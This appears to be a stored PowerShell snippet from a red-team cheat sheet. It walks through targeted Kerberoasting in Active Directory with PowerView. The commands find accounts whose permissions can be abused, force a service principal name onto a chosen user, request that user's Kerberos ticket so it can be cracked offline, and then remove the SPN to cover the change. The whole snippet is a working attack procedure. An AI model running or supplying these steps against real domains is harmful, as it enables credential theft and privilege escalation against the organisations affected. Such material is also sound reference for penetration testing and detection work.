---
id: 33aac37a-bc79-4ca6-9804-99db3e6740a1
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:06.700589+00:00'
updated_at: '2023-04-10T20:26:07.519848+00:00'
---

# Code Snippet 33aac37a

**Language**: Powershell

```powershell
# Check for interesting permissions on accounts:
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentinyReferenceName -match "RDPUsers"}

# Check if current user has already an SPN setted:
PowerView2 > Get-DomainUser -Identity <UserName> | select serviceprincipalname

# Force set the SPN on the account: Targeted Kerberoasting
PowerView2 > Set-DomainObject <UserName> -Set @{serviceprincipalname='ops/whatever1'}
PowerView3 > Set-DomainObject -Identity <UserName> -Set @{serviceprincipalname='any/thing'}

# Grab the ticket
PowerView2 > $User = Get-DomainUser username 
PowerView2 > $User | Get-DomainSPNTicket | fl
PowerView2 > $User | Select serviceprincipalname

# Remove the SPN
PowerView2 > Set-DomainObject -Identity username -Clear serviceprincipalname
```


